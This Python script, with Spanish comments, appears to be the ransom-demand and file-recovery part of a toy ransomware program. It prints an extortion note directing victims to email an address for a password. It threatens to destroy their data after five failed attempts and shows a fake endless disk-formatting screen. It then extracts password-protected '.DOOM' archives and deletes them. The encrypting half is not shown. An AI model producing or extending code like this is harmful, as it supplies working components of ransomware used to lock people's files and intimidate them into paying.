import os, zipfile, pyminizip, time , sys


#carpeta_destino="C:\\tmp\\"
carpeta_destino=os.getcwd()

lista = (".pdf", ".txt", ".jpg", ".doc", ".docx")
listad = ('.DOOM',".spec")



def PideDato():
    
    correo = "antonio@tork.uk"
    intentos:int = 5
    cadformat = "FORMATEANDO DISCOS..." 
    print("\n\nSi quieres ver tus archivos\nenvia un correo a " + correo + " e introduce la contrase*a requerida\nDispones de " , intentos , " intentos")
    contrasenia = input()
    # Bucle: pide la contraseña - Se puede cerrar el programa!!
    while True:
        intentos = intentos - 1
        if intentos == 0:
            #print(cadformat,end="")
            sys.stdout.write(cadformat)
            while True:
                sys.stdout.write(".")
                sys.stdout.flush()
                time.sleep(1)
        if contrasenia == "12345":
            print("\nContrase*a correcta. Desencriptando archivos. Have a nice day xD\n")
            break
        else:
            if intentos > 1:
                print("La contrase*a es incorrecta. Ingrese la contrase*a.")
            else:
                print("Contrase*a incorrecta. \n\nSolo te queda ",intentos," intento para que tu informacion no sea destruida")
            contrasenia = input()
        
    return contrasenia

def borrar_DOOM(carpeta):
    # Recorrer la carpeta en busca de archivos con las extensiones .pdf y .txt ...
    for archivo in os.listdir(carpeta):
        if archivo.endswith(listad[0]):
            # Si el archivo es de la extensión deseada, borrarlo
            file_path=os.path.join(carpeta, archivo)
            print("DEBUG DELETING",file_path)
            os.remove(file_path)
            #print(archivo)


def descomprimir_zipfile(carpeta):
    # Descomprimir con zipfile
    for filename in os.listdir(carpeta):
        if filename.endswith(listad[0]):
            #print("nombre fichero:", filename)
            # Crear un objeto ZipFile
            zip_file_name = os.path.join(carpeta, filename)
            print("DEBUG DESCOMPRIME:" ,zip_file_name)
            zip_file = zipfile.ZipFile(zip_file_name)
            #zip_file.setpassword(pwd=contrasenia.encode())
            #zip_file.extractall(pwd=contrasenia,path=carpeta)
            
            zip_file.extractall(carpeta,pwd=contrasenia.encode())
            # Cerrar el archivo ZIP
            zip_file.close()
            os.remove(zip_file_name)

def descomprimir_minizip(carpeta):    
    # Descomprimir con pyminizip
    for filename in os.listdir(carpeta):
        if filename.endswith(listad[0]):
            zip_file_name = os.path.join(carpeta, filename)
            print("DEBUG DESCOMPRIME:" ,zip_file_name)
            pyminizip.uncompress(zip_file_name, contrasenia , carpeta, 0)

contrasenia = PideDato()
#Versio1 descomprimir_zipfile(carpeta_destino):            
descomprimir_minizip(carpeta_destino)
borrar_DOOM(carpeta_destino)